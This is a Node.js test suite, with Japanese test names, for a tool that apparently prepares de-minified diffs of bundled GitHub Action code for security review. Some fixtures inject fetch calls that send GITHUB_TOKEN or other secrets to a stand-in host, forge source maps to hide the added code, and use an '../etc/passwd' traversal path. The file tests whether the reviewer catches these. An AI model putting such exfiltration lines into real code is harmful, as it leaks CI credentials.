"use strict";

const { test } = require("node:test");
const assert = require("node:assert/strict");
const fs = require("node:fs");
const os = require("node:os");
const path = require("node:path");
const crypto = require("node:crypto");
const { spawnSync } = require("node:child_process");
const { parse } = require("@babel/parser");
const generate = require("@babel/generator").default;
const { prepare, CHUNK_BYTES } = require("./prepare.cjs");

function compiled(code) {
  const result = generate(parse(code), { minified: true, comments: false, sourceMaps: true, sourceFileName: "src/main.js" }, code);
  return { code: result.code, map: result.map };
}

function fixture(t, before, after, options = {}) {
  const temporary = fs.mkdtempSync(path.join(os.tmpdir(), "bundle-review-"));
  t.after(() => fs.rmSync(temporary, { recursive: true, force: true }));
  const root = path.join(temporary, "evidence"), output = path.join(temporary, "prepared");
  fs.mkdirSync(root);
  const update = { directory: "001", repository: "fixture/action", before: {}, after: {} };
  for (const [side, value] of Object.entries({ before, after })) {
    if (!value) continue;
    update[side][`fixture/action@${side}`] = { commit: `sha1-${side === "before" ? "a" : "b"}` };
    const directory = path.join(root, "001", side);
    fs.mkdirSync(path.join(directory, "blobs"), { recursive: true });
    const tree = [];
    const files = { "dist/index.cjs": value.code };
    if (value.map !== undefined) files["dist/index.cjs.map"] = typeof value.map === "string" ? value.map : JSON.stringify(value.map);
    for (const [filename, text] of Object.entries(files)) {
      const bytes = Buffer.from(text);
      const oid = crypto.createHash("sha1").update(`blob ${bytes.length}\0`).update(bytes).digest("hex");
      fs.writeFileSync(path.join(directory, "blobs", oid), bytes);
      tree.push({ path: filename, mode: "100644", oid, size: bytes.length, content: `blobs/${oid}` });
    }
    fs.writeFileSync(path.join(directory, "tree.json"), JSON.stringify(tree));
  }
  fs.writeFileSync(path.join(root, "manifest.json"), JSON.stringify({ base: "a".repeat(40), head: "b".repeat(40), collection_status: "complete", updates: [update], ...options }));
  return { root, output, temporary, run: () => prepare(root, output), text: (file) => fs.readFileSync(path.join(output, file), "utf8") };
}

function diffText(f, bundle) {
  return bundle.normalized_diff.chunks.map((chunk) => f.text(`${bundle.directory}/${chunk.file}`)).join("");
}

test("圧縮した旧新コードを整形し、実行せず差分と元位置を保存する", (t) => {
  const marker = path.join(os.tmpdir(), `must-not-execute-${crypto.randomUUID()}`);
  const before = compiled("console.log('hello');");
  const after = compiled(`require('node:fs').writeFileSync(${JSON.stringify(marker)}, 'bad');fetch('https://example.invalid', {body:process.env.GITHUB_TOKEN});`);
  const f = fixture(t, before, after), report = f.run(), bundle = report.bundles[0];
  assert.equal(report.status, "complete");
  assert.equal(bundle.requires_bundle_review, true);
  assert.match(diffText(f, bundle), /process.env.GITHUB_TOKEN/);
  assert.equal(bundle.source_counts.changed, 1);
  assert.equal(bundle.after.source_map.status, "available_unverified");
  const positions = JSON.parse(f.text(`${bundle.directory}/${bundle.after.positions}`));
  assert.ok(positions.some((p) => p.raw_line === 1 && Number.isInteger(p.raw_column_utf16)));
  assert.equal(fs.existsSync(marker), false);
});

test("ソースマップが同じでもバンドルだけの追加を差分から除外しない", (t) => {
  const before = compiled("console.log('ok');");
  const after = { ...before, code: before.code + "fetch('https://example.invalid',{body:process.env.GITHUB_TOKEN});" };
  const f = fixture(t, before, after), bundle = f.run().bundles[0];
  assert.equal(bundle.requires_bundle_review, true);
  assert.equal(bundle.source_counts.unchanged, 1);
  assert.ok(bundle.warnings.includes("bundle_changed_but_source_map_unchanged"));
  assert.ok(bundle.warnings.includes("bundle_changed_without_sourcesContent_changes"));
  assert.match(diffText(f, bundle), /fetch/);
});

test("mapを更新して偽のソースへ対応付けても実行コードの調査を必須にする", (t) => {
  const before = compiled("console.log('ok');"), after = compiled("fetch(process.env.SECRET);");
  // A forged map can claim valid positions while describing benign content.
  after.map.sourcesContent = ["console.log('ok');".padEnd(200, " ")];
  const f = fixture(t, before, after), bundle = f.run().bundles[0];
  assert.equal(bundle.requires_bundle_review, true);
  assert.match(diffText(f, bundle), /process.env.SECRET/);
  assert.match(bundle.after.source_map.note, /証明ではない/);
});

test("mapがなくても整形差分を作り、mapがあるとは報告しない", (t) => {
  const f = fixture(t, { code: "let a=1;" }, { code: "let a=2;" });
  const bundle = f.run().bundles[0];
  assert.equal(bundle.after.source_map.status, "absent");
  assert.match(diffText(f, bundle), /let a = 2/);
});

test("不正なmapや範囲外の座標を不完全とし、バンドル差分は残す", (t) => {
  const before = compiled("let a=1;"), after = compiled("let a=2;");
  after.map.mappings = "AAAA;AAAA;AAAA;AAAA;AAAA;AAAA";
  const f = fixture(t, before, after), report = f.run();
  assert.equal(report.status, "incomplete");
  assert.ok(report.bundles[0].gaps.includes("after: source_map_parse_or_input_failed"));
  assert.match(diffText(f, report.bundles[0]), /let a = 2/);
});

test("構文解析失敗を空の差分や成功として扱わない", (t) => {
  const f = fixture(t, { code: "let a=1;" }, { code: "let = ;" });
  const report = f.run();
  assert.equal(report.status, "incomplete");
  assert.equal(report.bundles[0].requires_bundle_review, true);
  assert.equal(report.bundles[0].normalized_diff, undefined);
});

for (const side of ["before", "after"]) {
  for (const failure of ["invalid_json", "invalid_mapping", "absent"]) {
    test(`${side}のmapが${failure}ならソースの追加削除を確定しない`, (t) => {
      const values = { before: compiled("let a=1;"), after: compiled("let a=2;") };
      if (failure === "invalid_json") values[side].map = "{invalid";
      if (failure === "invalid_mapping") values[side].map.mappings = "AAAA;AAAA;AAAA;AAAA";
      if (failure === "absent") delete values[side].map;
      const f = fixture(t, values.before, values.after), report = f.run(), bundle = report.bundles[0];
      assert.equal(report.status, "incomplete");
      assert.equal(bundle.source_comparison, "unavailable");
      assert.equal(bundle.source_counts, null);
      assert.deepEqual(bundle.sources, []);
      assert.ok(bundle.gaps.includes("source_comparison_unavailable"));
      assert.equal(bundle.requires_bundle_review, true);
      assert.match(diffText(f, bundle), /let a = 2/);
    });
  }
}

test("巨大な一行とUTF-8文字を欠落なく小さいchunkへ分割する", (t) => {
  const f = fixture(t, { code: "const a='x';" }, { code: `const a=${JSON.stringify("日本語".repeat(12000))};` });
  const bundle = f.run().bundles[0];
  let offset = 0;
  const parts = bundle.after.chunks.map((chunk) => {
    const text = f.text(`${bundle.directory}/${chunk.file}`);
    assert.ok(Buffer.byteLength(text) <= CHUNK_BYTES);
    assert.equal(chunk.start_byte, offset);
    offset += Buffer.byteLength(text);
    assert.equal(chunk.end_byte, offset);
    return text;
  });
  assert.ok(parts.length > 1);
  const bytes = Buffer.from(parts.join(""));
  assert.equal(crypto.createHash("sha256").update(bytes).digest("hex"), bundle.after.normalized_sha256);
  assert.ok(!bytes.toString().includes("\ufffd"));
});

test("ソース名やsourceRootをファイルパスとして利用しない", (t) => {
  const before = compiled("let a=1;"), after = compiled("let a=2;");
  after.map.sourceRoot = "https://example.invalid/private/";
  after.map.sources = ["../../../../../etc/passwd"];
  const f = fixture(t, before, after), report = f.run();
  assert.equal(report.status, "complete");
  assert.ok(report.bundles[0].sources.some((s) => s.source.includes("etc/passwd")));
  assert.equal(fs.existsSync(path.join(f.temporary, "etc")), false);
});

test("sourcesContentが欠けるmapを成功扱いしない", (t) => {
  const before = compiled("let a=1;"), after = compiled("let a=2;");
  after.map.sourcesContent[0] = null;
  const f = fixture(t, before, after), result = f.run();
  assert.equal(result.status, "incomplete");
  assert.ok(result.bundles[0].sources.some((s) => s.gap === "missing_sourcesContent"));
});

test("改ざんされたblobのSHAを検知し、既存出力を上書きしない", (t) => {
  const f = fixture(t, { code: "let a=1;" }, { code: "let a=2;" });
  const directory = path.join(f.root, "001/after");
  const tree = JSON.parse(fs.readFileSync(path.join(directory, "tree.json")));
  fs.writeFileSync(path.join(directory, tree[0].content), "let a=3;");
  assert.equal(f.run().status, "incomplete");
  assert.throws(() => f.run(), /EEXIST/);
});

test("追加と削除の全コードを比較する", (t) => {
  const f = fixture(t, null, compiled("console.log('new');"));
  const report = f.run(), bundle = report.bundles[0];
  assert.equal(report.status, "complete");
  assert.equal(bundle.source_counts.added, 1);
  assert.match(diffText(f, bundle), /console.log/);
  const removed = fixture(t, compiled("console.log('old');"), null);
  const deleted = removed.run();
  assert.equal(deleted.status, "complete");
  assert.equal(deleted.bundles[0].source_counts.removed, 1);
  assert.match(diffText(removed, deleted.bundles[0]), /-console.log/);
});

test("重複するソース名を持つmapを黙ってマージしない", (t) => {
  const a = compiled("let a=1;"), b = compiled("let a=2;");
  b.map.sources.push(b.map.sources[0]); b.map.sourcesContent.push(b.map.sourcesContent[0]);
  const f = fixture(t, a, b);
  assert.equal(f.run().status, "incomplete");
});

test("同じコードでmapだけが変わった場合も処理する", (t) => {
  const a = compiled("let a=1;"), b = structuredClone(a);
  b.map.sourcesContent[0] = "let a=9;";
  const f = fixture(t, a, b), result = f.run();
  assert.equal(result.bundles.length, 1);
  assert.equal(result.bundles[0].bundle_changed, false);
  assert.equal(result.bundles[0].source_counts.changed, 1);
});

test("証拠ディレクトリの外を指すblobを読み込まない", (t) => {
  const f = fixture(t, { code: "let a=1;" }, { code: "let a=2;" });
  const directory = path.join(f.root, "001/after");
  const row = JSON.parse(fs.readFileSync(path.join(directory, "tree.json")))[0];
  const target = path.join(directory, row.content), outside = path.join(f.temporary, "outside");
  fs.copyFileSync(target, outside); fs.unlinkSync(target); fs.symlinkSync(outside, target);
  assert.equal(f.run().status, "incomplete");
});

test("CLIは解析不完全でもmanifestを残して終了コード2を返す", (t) => {
  const f = fixture(t, { code: "let a=1;" }, { code: "let = ;" });
  const run = spawnSync(process.execPath, [path.join(__dirname, "prepare.cjs"), "--evidence", f.root, "--output", f.output]);
  assert.equal(run.status, 2);
  assert.equal(JSON.parse(fs.readFileSync(path.join(f.output, "manifest.json"))).status, "incomplete");
});
